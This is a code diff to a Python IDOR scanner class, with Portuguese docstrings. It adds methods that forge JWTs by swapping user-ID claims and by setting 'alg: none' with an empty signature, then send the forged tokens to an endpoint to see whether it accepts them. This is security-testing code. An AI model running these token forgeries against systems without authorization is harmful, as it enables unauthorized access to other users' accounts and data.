@@ -615,6 +615,152 @@ class AdvancedIDORScanner:
         except Exception as e:
             raise ValueError(f"URL inválida: {e}")
 
+    def _manipulate_jwt(self, token: str, claim: str, new_value: str,
+                        use_alg_none: bool = False) -> Optional[str]:
+        """Manipula um JWT para testar IDOR via troca de claim (sem verificar assinatura).
+
+        Técnicas testadas:
+        - Troca direta do claim `sub`, `user_id`, `id`, `role` pelo valor do alvo
+        - Algorithm confusion: forja token com ``alg: none`` e assinatura vazia
+          para verificar se o servidor aceita tokens não assinados
+
+        Args:
+            token: JWT original (3 partes separadas por pontos)
+            claim: Nome do claim a modificar (ex: 'sub', 'user_id', 'id')
+            new_value: Valor a injetar no claim
+            use_alg_none: Se True, seta ``alg`` para ``none`` e limpa a assinatura
+
+        Returns:
+            Token JWT manipulado, ou None em caso de erro de decodificação.
+        """
+        try:
+            parts = token.split('.')
+            if len(parts) != 3:
+                return None
+
+            # Decodifica header
+            header_padding = len(parts[0]) % 4
+            header_b64 = parts[0] + ('=' * (4 - header_padding) if header_padding else '')
+            header = json.loads(base64.urlsafe_b64decode(header_b64))
+
+            # Decodifica payload
+            payload_padding = len(parts[1]) % 4
+            payload_b64 = parts[1] + ('=' * (4 - payload_padding) if payload_padding else '')
+            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+
+            # Modifica claim alvo
+            if claim in payload:
+                original_value = str(payload[claim])
+                payload[claim] = new_value
+                # Também modifica variantes comuns do mesmo claim
+                for alias in ('sub', 'user_id', 'userId', 'id', 'uid', 'account_id'):
+                    if alias in payload and alias != claim:
+                        payload[alias] = new_value
+            else:
+                payload[claim] = new_value
+
+            if use_alg_none:
+                header['alg'] = 'none'
+
+            # Re-codifica
+            new_header = base64.urlsafe_b64encode(
+                json.dumps(header, separators=(',', ':')).encode()
+            ).rstrip(b'=').decode()
+            new_payload = base64.urlsafe_b64encode(
+                json.dumps(payload, separators=(',', ':')).encode()
+            ).rstrip(b'=').decode()
+
+            # Assinatura vazia para alg=none, mantém original caso contrário
+            new_sig = '' if use_alg_none else parts[2]
+            return f"{new_header}.{new_payload}.{new_sig}"
+
+        except Exception as exc:
+            self.logger.debug(f"_manipulate_jwt falhou para claim={claim}: {exc}")
+            return None
+
+    def test_jwt_idor(self, url: str, method: str = 'GET',
+                      target_ids: Optional[List[str]] = None) -> List[Dict[str, Any]]:
+        """Testa IDOR via manipulação do JWT em Authorization: Bearer.
+
+        Para cada ID alvo tenta:
+        1. Trocar o claim ``sub``/``user_id`` pelo ID alvo e reenviar
+        2. Reutilizar o mesmo JWT com ``alg: none`` (assinatura removida)
+
+        Args:
+            url: Endpoint a testar
+            method: Método HTTP
+            target_ids: Lista de IDs a injetar; se None usa os 10 primeiros de _generate_test_ids()
+
+        Returns:
+            Lista de dicionários com findings de IDOR via JWT.
+        """
+        findings: List[Dict[str, Any]] = []
+        auth_header = self.session.headers.get('Authorization', '')
+        if not auth_header.startswith('Bearer '):
+            return findings
+
+        original_token = auth_header.split(' ', 1)[1]
+        if original_token.count('.') != 2:
+            return findings
+
+        claims_to_test = ['sub', 'user_id', 'userId', 'id', 'uid', 'account_id']
+        ids_to_test = (target_ids or self._generate_test_ids()[:10])
+
+        try:
+            baseline = self.session.request(method, url, timeout=10, verify=True)
+            baseline_size = len(baseline.content)
+        except requests.RequestException:
+            return findings
+
+        for test_id in ids_to_test:
+            for claim in claims_to_test:
+                # Test 1: direct claim swap
+                manip = self._manipulate_jwt(original_token, claim, test_id)
+                if manip and manip != original_token:
+                    try:
+                        resp = self.session.request(
+                            method, url,
+                            headers={'Authorization': f'Bearer {manip}'},
+                            timeout=10, verify=True
+                        )
+                        similarity = self.response_analyzer.analyze_response_similarity(baseline, resp)
+                        size_delta = abs(len(resp.content) - baseline_size)
+                        if resp.status_code == 200 and similarity > 0.5 and size_delta > 50:
+                            findings.append({
+                                'type': 'JWT IDOR (claim swap)',
+                                'url': url,
+                                'claim': claim,
+                                'injected_id': test_id,
+                                'status_code': resp.status_code,
+                                'size_delta': size_delta,
+                                'similarity': round(similarity, 2),
+                                'severity': 'HIGH',
+                            })
+                    except requests.RequestException:
+                        pass
+
+            # Test 2: alg=none forgery — only once per ID
+            alg_none_token = self._manipulate_jwt(original_token, 'sub', test_id, use_alg_none=True)
+            if alg_none_token:
+                try:
+                    resp = self.session.request(
+                        method, url,
+                        headers={'Authorization': f'Bearer {alg_none_token}'},
+                        timeout=10, verify=True
+                    )
+                    if resp.status_code == 200:
+                        findings.append({
+                            'type': 'JWT alg=none accepted',
+                            'url': url,
+                            'injected_id': test_id,
+                            'status_code': resp.status_code,
+                            'severity': 'CRITICAL',
+                        })
+                except requests.RequestException:
+                    pass
+
+        return findings
+
     def _generate_test_ids(self) -> List[str]:
         """Gera lista de IDs para teste baseado nas configurações."""
         # Verifica cache manual para garantir consistência
